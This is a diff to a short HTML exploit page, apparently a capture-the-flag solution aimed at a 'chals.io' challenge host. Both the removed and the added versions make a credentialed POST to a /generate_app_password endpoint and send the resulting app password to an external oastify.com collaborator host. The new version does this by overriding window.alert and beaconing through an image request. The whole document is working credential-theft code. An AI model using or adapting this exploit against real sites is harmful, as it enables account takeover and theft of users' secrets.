@@ -1,20 +1,22 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Exploit</title>
-  </head>
   <body>
     <script>
-      fetch("https://airbnb-hosts-2847774775fe-link-sheriff-0.chals.io/generate_app_password", {
+      // Intercept the alert that shows the password
+      window.alert = function(msg) {
+        // Match and extract the password
+        const match = msg.match(/App password generated: (.+)/);
+        if (match) {
+          const pw = match[1];
+          // Leak it to your server
+          new Image().src = "https://b5h4ui0sowd2dwguvbunx4psmjsag26qv.oastify.com/leak?pw=" + encodeURIComponent(pw);
+        }
+      };
+
+      // Trigger the password generation
+      fetch("/generate_app_password", {
         method: "POST",
         credentials: "include"
-      })
-      .then(res => res.json())
-      .then(data => {
-        location.href = "https://2mpvb9hj5nutunxlc2beev6j3a91xs1gq.oastify.com/leak?pw=" + encodeURIComponent(data.app_password);
-      })
-      .catch(err => {
-        location.href = "https://2mpvb9hj5nutunxlc2beev6j3a91xs1gq.oastify.com/error?msg=" + encodeURIComponent(err.message);
       });
     </script>
   </body>
